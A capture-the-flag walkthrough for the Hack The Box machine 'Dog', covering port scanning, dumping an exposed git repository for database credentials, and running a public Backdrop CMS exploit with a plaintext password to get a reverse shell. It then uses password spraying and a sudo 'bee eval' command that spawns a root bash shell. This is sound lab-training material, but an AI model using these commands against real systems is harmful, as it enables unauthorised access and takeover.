![](images/image0.png)

# Dog HTB Walkthrough

---

## Nmap Scan

```bash
nmap -p- -Pn 10.129.58.251 -v -T5 --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn 10.129.58.251 -sC -sV -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn 10.129.58.251 -v --script vuln -oN nmap_vuln.txt
```

![](images/image3.png)

---

## Web Enumeration

When looking at the website at port 808 we see the CMS running it:

![](images/image5.png)

Note we also found a git repository so let's check it.

![](images/image7.png)

---

## Git Repository Extraction

```bash
git-dumper http://10.129.58.251 .git
```

![](images/image1.png)

We then checked out the `settings.php` and found database credentials:

![](images/image6.png)

We also find a username at:

```
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active
```

![](images/image13.png)

Using the found credentials we successfully logged in as **tiffany**:

![](images/image12.png)
![](images/image4.png)

---

## Exploitation - Backdrop CMS RCE

Found this exploit online:  
🔗 [https://github.com/rvizx/backdrop-rce/](https://github.com/rvizx/backdrop-rce/)

Using this we gained a reverse shell:

```bash
python3 exploit.py http://10.129.58.251 tiffany@dog.htb BackDropJ2024DS2024
```

![](images/image15.png)

---

## Shell Stabilization

Then we upgraded the shell:

![](images/image8.png)

---

## Privilege Escalation - Password Reuse

Then I tried to password spray and it worked:

![](images/image9.png)

User flag is on the desktop.

---

## Sudo Privilege Escalation

We see that `sudo -l` gives us that we can run the **bee** command as sudo.

![](images/image14.png)

With `bee -h` we see what it does, and it can run arbitrary PHP code:

![](images/image10.png)
![](images/image2.png)

Note: we also need to set the root directory, so let’s craft our exploit:

```bash
sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash -p');"
```

![](images/image11.png)

It worked — we are **root**!  
Root flag is at `/root/root.txt`.

---
